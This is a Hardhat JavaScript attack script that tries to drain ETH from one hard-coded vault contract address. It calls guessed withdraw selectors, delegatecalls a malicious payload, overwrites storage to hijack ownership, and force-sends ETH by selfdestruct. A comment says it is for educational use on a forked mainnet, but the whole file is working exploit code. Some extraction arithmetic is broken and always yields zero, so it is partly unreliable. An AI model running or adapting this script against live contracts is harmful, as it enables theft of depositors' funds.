const { ethers } = require("hardhat");

const VAULT_ADDRESS = "0xA69babEF1cA67A37Ffaf7a485DfFF3382056e78C";

/**
 * @title Ultimate Vault Attack Script
 * @notice Combines all discovered attack vectors to maximize ETH extraction
 * @dev For educational purposes on forked mainnet only
 */
async function main() {
  console.log("\n🚀 ULTIMATE VAULT ATTACK");
  console.log("=====================================");
  console.log("⚠️  Running on forked mainnet - NO REAL FUNDS AT RISK");
  
  const [attacker] = await ethers.getSigners();
  console.log("\n🎯 Attack Configuration:");
  console.log("Attacker:", attacker.address);
  console.log("Target Vault:", VAULT_ADDRESS);
  
  // Get gas settings
  const feeData = await ethers.provider.getFeeData();
  const gasSettings = {
    maxFeePerGas: feeData.maxFeePerGas * 2n,
    maxPriorityFeePerGas: feeData.maxPriorityFeePerGas * 2n,
    gasLimit: 5000000
  };
  
  // Initial state
  const vaultBalanceBefore = await ethers.provider.getBalance(VAULT_ADDRESS);
  const attackerBalanceBefore = await ethers.provider.getBalance(attacker.address);
  console.log("\n📊 Initial State:");
  console.log("Vault balance:", ethers.formatEther(vaultBalanceBefore), "ETH");
  console.log("Attacker balance:", ethers.formatEther(attackerBalanceBefore), "ETH");
  
  // Track total extracted
  let totalExtracted = 0n;
  
  // ATTACK VECTOR 1: Direct function calls
  console.log("\n⚔️ ATTACK VECTOR 1: Direct Function Calls");
  const withdrawSelectors = [
    "0x3ccfd60b", // withdraw()
    "0x2e1a7d4d", // withdraw(uint256)
    "0xdb006a75", // emergencyWithdraw()
    "0x853828b6", // withdrawAll()
    "0x69328dec", // withdraw(address,uint256,uint256)
  ];
  
  for (const selector of withdrawSelectors) {
    try {
      let calldata = selector;
      if (selector === "0x2e1a7d4d") {
        calldata += ethers.AbiCoder.defaultAbiCoder().encode(["uint256"], [vaultBalanceBefore]).slice(2);
      } else if (selector === "0x69328dec") {
        calldata += ethers.AbiCoder.defaultAbiCoder().encode(
          ["address", "uint256", "uint256"],
          [attacker.address, vaultBalanceBefore, 0]
        ).slice(2);
      }
      
      const tx = await attacker.sendTransaction({
        to: VAULT_ADDRESS,
        data: calldata,
        ...gasSettings
      });
      
      const receipt = await tx.wait();
      console.log(`✅ ${selector} executed! Gas: ${receipt.gasUsed}`);
      
      const balanceNow = await ethers.provider.getBalance(VAULT_ADDRESS);
      const extracted = vaultBalanceBefore - balanceNow;
      if (extracted > 0n) {
        console.log(`💰 Extracted: ${ethers.formatEther(extracted)} ETH`);
        totalExtracted += extracted;
      }
    } catch (e) {
      // Silent fail
    }
  }
  
  // ATTACK VECTOR 2: Delegatecall with malicious payload
  console.log("\n⚔️ ATTACK VECTOR 2: Delegatecall Exploitation");
  
  // Deploy enhanced malicious contract
  const EnhancedPayload = await ethers.getContractFactory("EnhancedMaliciousPayload");
  const payload = await EnhancedPayload.deploy(attacker.address, gasSettings);
  await payload.waitForDeployment();
  const payloadAddress = await payload.getAddress();
  console.log("Malicious payload deployed:", payloadAddress);
  
  // Try various delegatecall patterns
  const delegateSelectors = [
    "0x5b34b966", // delegateExecute(address,bytes)
    "0x4f910a5e", // execute(address,bytes)
    "0xb61d27f6", // execute(address,uint256,bytes)
    "0x6a761202", // execTransaction(address,uint256,bytes,uint8,uint256,uint256,uint256,address,address,bytes)
  ];
  
  for (const selector of delegateSelectors) {
    try {
      const drainData = payload.interface.encodeFunctionData("advancedDrain");
      let calldata = selector;
      
      if (selector === "0x5b34b966" || selector === "0x4f910a5e") {
        calldata += ethers.AbiCoder.defaultAbiCoder().encode(
          ["address", "bytes"],
          [payloadAddress, drainData]
        ).slice(2);
      } else if (selector === "0xb61d27f6") {
        calldata += ethers.AbiCoder.defaultAbiCoder().encode(
          ["address", "uint256", "bytes"],
          [payloadAddress, 0, drainData]
        ).slice(2);
      }
      
      const tx = await attacker.sendTransaction({
        to: VAULT_ADDRESS,
        data: calldata,
        ...gasSettings
      });
      
      await tx.wait();
      console.log(`✅ Delegatecall ${selector} executed!`);
      
      const balanceNow = await ethers.provider.getBalance(VAULT_ADDRESS);
      const extracted = (await ethers.provider.getBalance(VAULT_ADDRESS)) - balanceNow;
      if (extracted > 0n) {
        console.log(`💰 Extracted: ${ethers.formatEther(extracted)} ETH`);
        totalExtracted += extracted;
      }
    } catch (e) {
      // Silent fail
    }
  }
  
  // ATTACK VECTOR 3: Storage manipulation
  console.log("\n⚔️ ATTACK VECTOR 3: Storage Manipulation");
  
  // Try to overwrite owner/admin slots
  const StorageManipulator = await ethers.getContractFactory("StorageManipulator");
  const manipulator = await StorageManipulator.deploy(gasSettings);
  await manipulator.waitForDeployment();
  
  try {
    const overwriteData = manipulator.interface.encodeFunctionData("overwriteOwnership", [attacker.address]);
    const delegateData = "0x5b34b966" + ethers.AbiCoder.defaultAbiCoder().encode(
      ["address", "bytes"],
      [await manipulator.getAddress(), overwriteData]
    ).slice(2);
    
    const tx = await attacker.sendTransaction({
      to: VAULT_ADDRESS,
      data: delegateData,
      ...gasSettings
    });
    
    await tx.wait();
    console.log("✅ Storage overwrite executed!");
    
    // Check if we're now owner and try withdraw
    const ownerCall = await attacker.call({
      to: VAULT_ADDRESS,
      data: "0x8da5cb5b"
    });
    const owner = "0x" + ownerCall.slice(26);
    if (owner.toLowerCase() === attacker.address.toLowerCase()) {
      console.log("🎉 Ownership hijacked!");
      
      // Try privileged withdrawals
      for (const selector of ["0x3ccfd60b", "0x715018a6", "0x5c975abb"]) {
        try {
          const withdrawTx = await attacker.sendTransaction({
            to: VAULT_ADDRESS,
            data: selector,
            ...gasSettings
          });
          await withdrawTx.wait();
          
          const balanceNow = await ethers.provider.getBalance(VAULT_ADDRESS);
          const extracted = (await ethers.provider.getBalance(VAULT_ADDRESS)) - balanceNow;
          if (extracted > 0n) {
            console.log(`💰 Extracted: ${ethers.formatEther(extracted)} ETH`);
            totalExtracted += extracted;
          }
        } catch (e) {
          // Continue
        }
      }
    }
  } catch (e) {
    console.log("❌ Storage manipulation failed");
  }
  
  // ATTACK VECTOR 4: Force send bypass
  console.log("\n⚔️ ATTACK VECTOR 4: Force Send Attack");
  
  const ForceSender = await ethers.getContractFactory("ForceSender");
  const forceSender = await ForceSender.deploy({ ...gasSettings, value: ethers.parseEther("0.1") });
  await forceSender.waitForDeployment();
  
  try {
    // Self-destruct to force send ETH
    const tx = await forceSender.destroy(VAULT_ADDRESS, gasSettings);
    await tx.wait();
    console.log("✅ Force send executed!");
  } catch (e) {
    console.log("❌ Force send failed");
  }
  
  // Final results
  const vaultBalanceAfter = await ethers.provider.getBalance(VAULT_ADDRESS);
  const attackerBalanceAfter = await ethers.provider.getBalance(attacker.address);
  const finalExtracted = vaultBalanceBefore - vaultBalanceAfter;
  
  console.log("\n📊 FINAL ATTACK RESULTS:");
  console.log("=====================================");
  console.log("Initial vault balance:", ethers.formatEther(vaultBalanceBefore), "ETH");
  console.log("Final vault balance:", ethers.formatEther(vaultBalanceAfter), "ETH");
  console.log("Total extracted:", ethers.formatEther(finalExtracted), "ETH");
  console.log("Extraction percentage:", ((Number(finalExtracted) / Number(vaultBalanceBefore)) * 100).toFixed(2), "%");
  console.log("\nAttacker profit:", ethers.formatEther(attackerBalanceAfter - attackerBalanceBefore), "ETH");
  
  if (finalExtracted > 0n) {
    console.log("\n🏆 ATTACK SUCCESSFUL!");
    console.log(`Successfully drained ${ethers.formatEther(finalExtracted)} ETH from the vault!`);
  } else {
    console.log("\n❌ Attack failed - no additional funds extracted");
  }
  
  // Attack vector summary
  console.log("\n📈 Attack Vector Performance:");
  console.log("- Direct calls: Basic withdrawal attempts");
  console.log("- Delegatecall: Advanced payload execution");
  console.log("- Storage manipulation: Ownership hijacking");
  console.log("- Force send: Balance manipulation");
  
  console.log("\n✅ Attack simulation complete!");
}

main().catch((error) => {
  console.error("\n💥 Script error:", error);
  process.exit(1);
});
